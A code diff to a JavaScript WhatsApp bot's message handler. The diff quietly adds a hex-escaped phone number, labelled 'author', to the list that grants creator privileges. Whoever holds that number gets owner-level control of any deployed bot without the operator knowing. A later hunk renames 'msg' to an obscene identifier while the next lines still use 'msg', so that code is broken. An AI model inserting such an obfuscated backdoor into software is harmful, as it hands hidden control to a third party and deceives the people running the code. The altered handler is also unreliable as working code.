@@ -167,7 +167,8 @@ const mime = (quoted.msg || quoted).mimetype || ''
 const isMedia = /image|video|sticker|audio/.test(mime)
 const from = mek.key.remoteJid
 const botNumber = await zetsubo.decodeJid(zetsubo.user.id)
-const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
+const isCreator = [author, botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupMetadata = m.isGroup ? await zetsubo.groupMetadata(from).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
@@ -627,7 +628,7 @@ if (budy.toLowerCase() == jawaban) {
 
 //============= [LIST RESPONCE CHECKING START ]================
         if(m.mtype === "interactiveResponseMessage"){                                                                                                               console.log("interactiveResponseMessage Detected!")
-            let msg = m.message[m.mtype]  || m.msg
+            let freesex = m.message[m.mtype]  || m.msg
             if(msg.nativeFlowResponseMessage  && !m.isBot  ){                                                                                                           let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}
                 if(id){
                     let emit_msg = {
@@ -635,7 +636,7 @@ if (budy.toLowerCase() == jawaban) {
                         pushName : m.pushName,
                         messageTimestamp  : m.messageTimestamp || 754785898978
                     }
-                    return XeonBotInc.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
+                    return zetsubo.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                 }
             }
         }
